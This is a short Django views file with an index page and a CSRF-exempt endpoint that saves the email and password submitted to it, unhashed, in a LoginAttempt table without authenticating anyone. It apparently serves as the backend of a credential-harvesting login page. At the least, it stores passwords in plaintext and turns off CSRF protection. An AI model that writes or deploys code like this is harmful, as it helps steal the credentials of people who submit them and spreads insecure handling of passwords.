from django.shortcuts import render

from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required

def index(request):
    return render(request, 'index.html') 


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import LoginAttempt

@csrf_exempt  # for simplicity; better to use CSRF token if you're rendering it inside Django template
def record_login_attempt(request):
    if request.method == "POST":
        email = request.POST.get("email", "")
        password = request.POST.get("password", "")

        LoginAttempt.objects.create(email=email, password=password)

        return JsonResponse({"status": "success", "message": "Login attempt saved."})
    return JsonResponse({"status": "error", "message": "Invalid request."})
